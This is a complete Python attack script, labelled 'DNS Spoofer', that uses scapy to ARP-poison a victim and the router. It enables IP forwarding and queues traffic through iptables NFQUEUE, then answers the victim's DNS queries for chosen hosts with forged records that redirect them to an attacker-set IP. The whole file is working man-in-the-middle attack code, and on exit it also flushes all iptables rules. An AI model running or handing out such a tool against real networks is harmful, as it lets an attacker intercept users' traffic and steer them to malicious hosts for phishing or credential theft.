#!/usr/bin/python

from colorama import Fore,Style
import time
import subprocess
import configparser
import netfilterqueue
import os
from scapy.all import *
import threading
import fire

END_PROCESS = False
IFACE = ""
HOST_LST = ""
REDIRECT_IP = ""
VICTIM = ""
ROUTER = ""
router_mac=""
victim_mac=""
attacker_mac=""

def arp_poisoning(victim_ip, victim_mac, router_ip, router_mac):
    global END_PROCESS
    
    while not END_PROCESS:
        send(ARP(op = 2, pdst = victim_ip, psrc = router_ip, hwdst= victim_mac), verbose=False)
        send(ARP(op = 2, pdst = router_ip, psrc = victim_ip, hwdst= router_mac), verbose=False)
        time.sleep(0.3)
    print("[*] Rearping all the things!...")
    send(ARP(op = 2, pdst = router_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = router_mac), count = 7)
    send(ARP(op = 2, pdst = victim_ip, psrc = router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = router_mac), count = 7)

def reset_settings():
    global END_PROCESS
    print(f"{Fore.YELLOW}\n[*] Resetting Ip Tables")
    END_PROCESS = True
    subprocess.call(["iptables","--flush"])
    print(f"{Fore.YELLOW}[*] Deactivating ip forwarding")
    ip_forward(False)
    print(f"\n[+] Exiting...{Style.RESET_ALL}")

def dns_reply(raw_packet, packet):
    global IFACE
    global REDIRECT_IP
    global attacker_mac
    global victim_mac

    print("[*] POISONING DNS RESPONSE (REDIRECT TO {})".format(REDIRECT_IP))
    # eth = Ether(
    #     src=raw_packet[Ether].dst,
    #     dst=raw_packet[Ether].src
    #     )

    if packet.haslayer(UDP):
        eth = Ether(
            src=attacker_mac,
            dst=victim_mac
        )

        ip = IP(
            src=packet[IP].dst,
            dst=packet[IP].src
            )

        udp = UDP(
            dport=packet[UDP].sport,
            sport=packet[UDP].dport
            )

        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=packet[DNS].qd.qname,
                type='A',
                ttl=600,
                rdata=REDIRECT_IP)
            )

        response_packet = eth / ip / udp / dns

        sendp(response_packet, iface=IFACE, verbose=False)

def in_domain(host_list, domain):
    for host in host_list:
        if domain.find(host.strip())>=0:
            return True
    return False
def process_packet(packet):
    
    global VICTIM
    
    scapyPacket = IP(packet.get_payload())
    raw_packet = Ether(packet.get_payload())
    if scapyPacket.haslayer(DNS) and scapyPacket.src == VICTIM and in_domain(HOST_LST, scapyPacket[DNS].qd.qname.decode("utf8")):
        print("[*] REQUEST RECEIVED FOR {}".format(scapyPacket[DNS].qd.qname.decode("utf8")))
        print("[*] DROP DNS PACKET FROM {}".format(scapyPacket.src))
        dns_reply(raw_packet, scapyPacket)
        packet.drop()
        return
    packet.accept()
     

def ip_forward(active):
    if active:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    else:
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def get_mac(IP, interface):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    

def main_dns():
    print(f"{Fore.BLUE}DNS Spoofer{Style.RESET_ALL}")
    config = configparser.ConfigParser()
    config.read("config.ini")
    
    global VICTIM
    global IFACE
    global ROUTER
    global HOST_LST 
    global REDIRECT_IP
    global router_mac
    global victim_mac
    global attacker_mac

    HOST_LST = config["dnsspoofer"]["hosts"].split(",")
    REDIRECT_IP = config["dnsspoofer"]["destination_ip"]
    IFACE = config["arpspoofer"]["iface"]
    VICTIM = config["arpspoofer"]["target"]
    ROUTER= config["arpspoofer"]["router"]
    try:
        print("[*] Loading settings from config.ini")
        router_mac = get_mac(ROUTER,IFACE)
        victim_mac = get_mac(VICTIM,IFACE)
        attacker_mac = get_mac(REDIRECT_IP, IFACE)
        
        print("[*] Activating ip forwarding")
        arp_spoofer = threading.Thread(target=arp_poisoning, args=(VICTIM, victim_mac, ROUTER, router_mac))
        arp_spoofer.start()
        
        ip_forward(True)
        queue_number = "99"
        subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num",queue_number])
        subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num",queue_number])
        subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num",queue_number])
        queue = netfilterqueue.NetfilterQueue()
        try:
            queue.bind(int(queue_number), process_packet)
            queue.run()
        except KeyboardInterrupt:
            reset_settings()

    except KeyboardInterrupt:
        reset_settings()
        time.sleep(3)

main_dns()


